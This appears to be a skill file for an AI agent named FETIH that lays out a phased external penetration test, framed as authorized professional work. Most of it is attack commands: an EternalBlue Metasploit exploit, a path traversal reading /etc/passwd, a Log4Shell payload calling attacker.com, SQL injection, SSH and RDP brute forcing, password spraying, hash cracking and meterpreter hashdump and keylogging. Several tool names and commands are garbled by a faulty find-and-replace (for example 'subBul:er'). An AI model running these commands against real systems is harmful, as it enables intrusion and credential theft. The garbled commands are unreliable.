---
name: performing-external-network-penetration-test
description: Conduct a comprehensive external network penetration test to identify vulnerabilities in internet-facing infrastructure using PTES methodology, reconnaissance, scanning, exploitation, and reporting.
tags:
- cybersecurity
- vulnerability-assessment
- PTES
- network-security
- external-pentest
- OSSTMM
- Metasploit
- reconnaissance
- exploitation
- fetih
- penetration-testing
- siber-güvenlik
- Nmap
triggers:
- api
- certificate
- cloud
- dns
- email
- endpoint
- exploit
- external
- hash
- http
- incident
- log
category: penetration-testing
source_subdomain: penetration-testing
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
adapted_for: fetih
---

# Performing External Network Penetration Test


## Genel Bakış

An external network penetration test simulates a real-world attacker targeting an organization's internet-facing assets such as firewalls, web servers, mail servers, DNS servers, VPN gateways, and cloud endpoints. The objective is to identify exploitable vulnerabilities before malicious actors do, following frameworks like PTES (Penetration Testing Execution Standard), OSSTMM, and NIST SP 800-115.


## Ne Zaman Kullanılır

- conducting yaparken security assessments that involve performing external network penetration test
- following yaparken: incident response procedures for related security events
- performing yaparken scheduled security testing or auditing activities
- validating yaparken security controls through hands-on testing

## Ön Gereksinimler

- Written authorization (Rules of Engagement document signed by asset owner)
- Defined scope: IP ranges, domains, subdomains, and exclusions
- Testing environment: Kali Linux or Parrot OS with updated tools
- VPN/dedicated testing infrastructure to avoid IP blocks
- Coordination with SOC/NOC for timing windows

## Phase 1 — Pre-Engagement and Scoping

### Define Rules of Engagement

```
Scope:
  - Target IP ranges: 203.0.113.0/24, 198.51.100.0/24
  - Domains: *.target.com, *.target.io
  - Exclusions: 203.0.113.50 (production DB), *.staging.target.com
  - Testing window: Mon-Fri 22:00-06:00 UTC
  - Emergency contact: SOC Lead — +1-555-0100
  - Authorization ID: PENTEST-2025-EXT-042
```

### Legal Documentation Checklist

| Document | Status | Owner |
|----------|--------|-------|
| Master Service Agreement (MSA) | Signed | Legal |
| Statement of Work (SOW) | Signed | PM |
| Rules of Engagement (RoE) | Signed | CISO |
| Get-Out-of-Jail Letter | Signed | CTO |
| NDA | Signed | Legal |
| Insurance Certificate | Verified | Risk |

## Phase 2 — Reconnaissance (Information Gathering)

### Passive Reconnaissance

```bash
subBul:er -d target.com -o subdomains.txt
amass enum -passive -d target.com -o amass_subs.txt
cat subdomains.txt amass_subs.txt | sort -u > all_subs.txt

dig target.com ANY +noall +answer
dig target.com MX +short
dig target.com NS +short
dig target.com TXT +short

whois target.com
whois -h whois.radb.net -- '-i origin AS12345'

curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u


shodan search "org:Target Corp" --fields ip_str,port,product
shodan host 203.0.113.10

theHarvester -d target.com -b all -l 500 -f theharvester_results

trufflehog github --org=targetcorp --concurrency=5
gitleaks tespit etme--source=https://github.com/targetcorp/repo
```

### Active Reconnaissance

```bash
nmap -sn 203.0.113.0/24 -oG ping_sweep.gnmap

nmap -sS -sV -O -T4 203.0.113.0/24 -oA tcp_scan

nmap -sS -p- -T4 --min-rate 1000 203.0.113.0/24 -oA full_tcp

nmap -sU --top-ports 100 -T4 203.0.113.0/24 -oA udp_scan

nmap -sV -sC -p 21,22,25,53,80,110,143,443,445,993,995,3389,8080,8443 203.0.113.0/24 -oA service_scan

sslscan 203.0.113.10:443
testssl.sh --full https://target.com

whatweb -v https://target.com
wappalyzer https://target.com
```

## Phase 3 — Vulnerability Analysis

### Automated Scanning

```bash
nessuscli scan --new --name "External-Pentest-2025" \
  --targets 203.0.113.0/24 \
  --policy "Advanced Network Scan"

gvm-cli socket --xml '<create_task>
  <name>External Pentest</name>
  <target id="target-uuid"/>
  <config id="daba56c8-73ec-11df-a475-002264764cea"/>
</create_task>'

nuclei -l all_subs.txt -t cves/ -t exposures/ -t misconfigurations/ \
  -severity critical,high -o nuclei_results.txt

nikto -h https://target.com -output nikto_results.html -Format htm

gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,asp,aspx,jsp,html,txt -o gobuster_results.txt
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  --depth 3 -o ferox_results.txt
```

### Manual Vulnerability Validation

```bash
searchsploit apache 2.4.49
searchsploit openssh 8.2

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  ssh://203.0.113.10 -t 4

ike-scan 203.0.113.20

snmpwalk -v2c -c public 203.0.113.30
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 203.0.113.0/24

smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 203.0.113.25
```

## Phase 4 — Exploitation

### Network Service Exploitation

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 203.0.113.15
set LHOST 10.10.14.5
set LPORT 4444
exploit

curl -s --path-as-is "https://target.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

python3 proxyshell_exploit.py -u https://mail.target.com -e admin@target.com

curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/exploit}' https://target.com/api
```

### Web Application Exploitation

```bash
sqlmap -u "https://target.com/page?id=1" --batch --dbs --risk=3 --level=5

dalfox url "https://target.com/search?q=test" --skip-bav

commix --url="https://target.com/ping?host=127.0.0.1" --batch

```

### Password Attacks

```bash
crowbar -b rdp -s 203.0.113.40/32 -u admin -C /usr/share/wordlists/rockyou.txt -n 4

sprayhound -U users.txt -p 'Spring2025!' -d target.com -url https://mail.target.com/owa

hashcat -m 5600 captured_ntlmv2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## Phase 5 — Post-Exploitation

```bash
meterpreter> sysinfo
meterpreter> getuid
meterpreter> hashdump
meterpreter> run post/multi/recon/local_exploit_suggester

./linpeas.sh | tee linpeas_output.txt
.\winPEAS.exe | tee winpeas_output.txt

echo "PENTEST-PROOF-$(date +%Y%m%d)" > /tmp/pentest_proof.txt

ssh -D 9050 user@203.0.113.15
proxychains nmap -sT -p 80,443,445 10.0.0.0/24

meterpreter> screenshot
meterpreter> keyscan_start
```

## Phase 6 — Reporting

### Bul:ing Classification (CVSS v3.1)

| Severity | CVSS Range | Count | Example |
|----------|-----------|-------|---------|
| Critical | 9.0-10.0 | 2 | RCE via unpatched Exchange (ProxyShell) |
| High | 7.0-8.9 | 5 | SQL Injection in customer portal |
| Medium | 4.0-6.9 | 8 | Missing security headers, TLS 1.0 |
| Low | 0.1-3.9 | 12 | Information disclosure via server banners |
| Info | 0.0 | 6 | Open ports documentation |

### Report Structure

```
1. Executive Summary
   - Scope and objectives
   - Key Bul:ings summary
   - Risk rating overview
   - Strategic recommendations

2. Technical Bul:ings
   For each Bul:ing:
   - Title and CVSS score
   - Affected asset(s)
   - Description and impact
   - Steps to reproduce (with screenshots)
   - Evidence/proof of exploitation
   - Remediation recommendation
   - References (CVE, CWE)

3. Methodology
   - Tools used
   - Testing timeline
   - Frameworks followed (PTES, OWASP)

4. Appendices
   - Full scan results
   - Network diagrams
   - Raw tool output
```

## İyileştirme Priority Matrix

| Priority | Timeline | Action |
|----------|----------|--------|
| P1 — Critical | 24-48 hours | Patch RCE vulnerabilities, disable exposed admin panels |
| P2 — High | 1-2 weeks | Fix injection flaws, implement MFA |
| P3 — Medium | 30 days | Harden TLS configs, add security headers |
| P4 — Low | 60-90 days | Remove version banners, update documentation |

## Tools Reference

| Tool | Purpose | License |
|------|---------|---------|
| Nmap | Port scanning and service enumeration | GPLv2 |
| Metasploit | Exploitation framework | BSD |
| Burp Suite Pro | Web application testing | Commercial |
| Nuclei | Vulnerability scanning | MIT |
| SubBul:er | Subdomain enumeration | MIT |
| SQLMap | SQL injection testing | GPLv2 |
| Nessus | Vulnerability scanner | Commercial |
| Gobuster | Directory brute-forcing | Apache 2.0 |
| Hashcat | Password cracking | MIT |
| theHarvester | OSINT email/domain harvesting | GPLv2 |

## References

- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/
- OWASP Testing Guide v4.2: https://owasp.org/www-project-web-security-testing-guide/
- NIST SP 800-115: Technical Guide to Information Security Testing: https://csrc.nist.gov/publications/detail/sp/800-115/final
- OSSTMM v3: https://www.isecom.org/OSSTMM.3.pdf
- MITRE ATT&CK: https://attack.mitre.org/

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 0840bd9c8a2da25a
-->

